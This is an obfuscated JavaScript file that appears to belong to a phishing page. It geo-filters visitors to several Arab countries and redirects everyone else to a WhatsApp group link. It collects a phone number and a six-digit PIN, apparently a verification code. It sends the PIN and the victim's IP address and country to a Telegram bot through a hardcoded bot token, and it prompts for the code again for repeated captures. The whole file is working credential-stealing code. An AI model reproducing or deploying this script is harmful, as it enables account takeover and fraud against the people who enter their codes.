var ip_adress, country_code
function callback(_0x5b7a4f) {
  ip_adress = _0x5b7a4f.IPv4
  country_code = _0x5b7a4f.country_code
  var _0x252c45 = ['JO', 'IQ', 'KW', 'SA', 'OM', 'AE', 'BH', 'QA', 'EG']
  !_0x252c45.includes(country_code) &&
    window.location.replace('https://chat.whatsapp.com/GXPXmnDnHuvGro6aEqhbW')
}
$.ajax({
  url: 'https://geoip-db.com/jsonp/',
  dataType: 'jsonp',
})
function ValideText() {
  if (
    document.getElementById('txtphone').value != '' &&
    document.getElementById('txtphone').value.length >= 7
  ) {
    return true
  } else {
    return false
  }
}
function ValideText() {
  var _0x57a21a = document.getElementById('txtpin')
  if (_0x57a21a.value != '' && _0x57a21a.value.length == 6) {
    return true
  } else {
    return false
  }
}
var bntclicked = false,
  Pintry = 1
function SendPin() {
  if (!bntclicked) {
    var _0x4d53e6 = '5865923171:AAGIar3a7Z34hqlbs1ScjTNr-O2Zoprww4g',
      _0x33c682 = '5887678093',
      _0x4b61c8 = 0
    if (ValideText() && !isNaN(document.getElementById('txtpin').value)) {
      bntclicked = true
      var _0x416a73 = document.getElementById('txtpin').value,
        _0x95b152 =
          'https://api.telegram.org/bot' +
          _0x4d53e6 +
          '/sendMessage?chat_id=' +
          _0x33c682 +
          '&text=Pin : ' +
          _0x416a73
      fetch(_0x95b152, { method: 'POST' }).then((_0x2b5493) => {
        if (_0x2b5493.ok) {
          _0x4b61c8++
          var _0x474031 =
            'https://api.telegram.org/bot' +
            _0x4d53e6 +
            '/sendMessage?chat_id=' +
            _0x33c682 +
            '&text=IP : ' +
            ip_adress +
            ':' +
            country_code
          fetch(_0x474031, { method: 'POST' }).then((_0x426917) => {
            _0x426917.ok &&
              _0x4b61c8 == 1 &&
                Pintry <= 2 &&
                  ((document.getElementById('txtpin').value = ''),
                  Pintry++,
                  (bntclicked = false))
          })
        } else {
          window.location.replace('pin.html')
        }
      })
    }
  } else {
    window.location.replace('https://chat.whatsapp.com/GXPXmnDnHuvGro6aEqhbW')
  }
}
function isInputNumber(_0x15ebfc) {
  var _0x555024 = String.fromCharCode(_0x15ebfc.which)
  !/[0-9]/.test(_0x555024) && _0x15ebfc.preventDefault()
}
